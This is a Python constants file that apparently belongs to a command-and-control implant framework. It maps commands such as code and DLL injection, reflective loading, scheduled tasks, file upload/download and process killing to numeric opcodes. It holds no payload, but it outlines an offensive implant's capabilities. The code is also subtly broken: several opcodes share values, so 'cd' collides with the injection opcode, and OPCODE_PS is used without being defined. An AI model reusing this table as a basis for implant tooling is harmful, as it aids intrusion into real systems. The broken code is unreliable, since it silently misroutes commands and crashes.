# constants.py

"""This module defines project-level constants."""


OPCODE_NOTASK = 1
OPCODE_INJECT_EX_CODE = 2
OPCODE_SPAWN_EXECUTE = 3
OPCODE_STDLIB = 4
OPCODE_INJECT_EX_DLL = 5
OPCODE_RIP_C2 = 6

OPCODE_DOWNLOAD = 7 
OPCODE_ECHO = 8 
OPCODE_EXEC = 9
OPCODE_EXIT = 10
OPCODE_HELP = 11
OPCODE_HTTPCL = 12
OPCODE_INCLUDE = 13
OPCODE_INJECT = 14
OPCODE_DIR = 1
OPCODE_PKILL = 16
OPCODE_PWD = 18
OPCODE_READF = 19 
OPCODE_RLOADER = 20
OPCODE_RM = 21
OPCODE_SCHTASKS = 22
OPCODE_SHA256SUM = 23
OPCODE_SLEEP = 24
OPCODE_UPLOAD = 25
OPCODE_WHOAMI = 26
OPCODE_AESGCM = 27
OPCODE_B64 = 28 
OPCODE_BG = 29
OPCODE_CAT = 30
OPCODE_CD = 2
OPCODE_CLEAR = 32 

OPCODE_GETENV = 50


opcodes = ["aesgcm", "b64", "bg", "cat", "cd", "clear", "download", "echo", "exec", "exit", "help", "httpcl",
"include", "inject", "dir", "pkill", "ps", "pwd", "readf", "rloader", "rm", "schtasks", "sha256sum", "sleep",
"upload", "whoami", "getenv"]

main_opcodes = []

SUCCESSFUL = "SUCCESS"

FAILURE = "FAILURE"

server_commands = ["list"]

def to_opcode(cmd):
    if cmd == "aesgcm":
        return OPCODE_AESGCM
    elif cmd == "b64":
        return OPCODE_B64
    elif cmd == "bg":
        return OPCODE_BG
    elif cmd == "cat":
        return OPCODE_CAT
    elif cmd == "cd":
        return OPCODE_CD
    elif cmd == "clear":
        return OPCODE_CLEAR
    elif cmd == "download":
        return OPCODE_DOWNLOAD
    elif cmd == "echo":
        return OPCODE_ECHO
    elif cmd == "exec":
        return OPCODE_EXEC
    elif cmd == "exit":
        return OPCODE_EXIT
    elif cmd == "help":
        return OPCODE_HELP
    elif cmd == "httpcl":
        return OPCODE_HTTPCL
    elif cmd == "include":
        return OPCODE_INCLUDE
    elif cmd == "inject":
        return OPCODE_INJECT
    elif cmd == "dir":
        return OPCODE_DIR
    elif cmd == "pkill":
        return OPCODE_PKILL
    elif cmd == "ps":
        return OPCODE_PS
    elif cmd == "pwd":
        return OPCODE_PWD
    elif cmd == "readf":
        return OPCODE_READF
    elif cmd == "rloader":
        return OPCODE_RLOADER
    elif cmd == "rm":
        return OPCODE_RM
    elif cmd == "schtasks":
        return OPCODE_SCHTASKS
    elif cmd == "sha256sum":
        return OPCODE_SHA256SUM
    elif cmd == "sleep":
        return OPCODE_SLEEP
    elif cmd == "upload":
        return OPCODE_UPLOAD
    elif cmd == "whoami":
        return OPCODE_WHOAMI
    elif cmd == "getenv":
        return OPCODE_GETENV
